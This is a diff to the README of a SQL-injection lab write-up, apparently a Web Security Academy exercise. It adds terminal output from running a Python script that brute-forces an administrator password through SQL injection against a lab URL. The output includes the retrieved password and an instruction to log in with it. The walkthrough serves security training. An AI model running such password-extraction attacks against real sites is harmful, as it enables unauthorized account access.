@@ -120,9 +120,17 @@ Python script usage and output:
 
 - The sqli-lab-11.py script brute forces the password with SQL injections without triggering the "you have reached X maximum tries"
 
+
+┌──(kali㉿kali)-[~/Downloads/SQL-Injection-Labs/lab-11]
+└─$ python3 sqli-lab-11.py "https://0a4f00bc0468443682f0cede00ba0037.web-security-academy.net"
+[+] Retrieving administrator password...
+[-] ERROR: The webpage you are requesting does not exist...
+
+
 ┌──(kali㉿kali)-[~/Downloads/SQL-Injection-Labs/lab-11]
 └─$ python3 sqli-lab-11.py "https://0a4f00bc0468443682f0cede00ba0037.web-security-academy.net"
 [+] Retrieving administrator password...
 ylj7y9lgkrol1vbqhfju
+[+] Brute-force exploit completed.
 
 Copy/paste the password above into the browser's login form and voila, you're in.
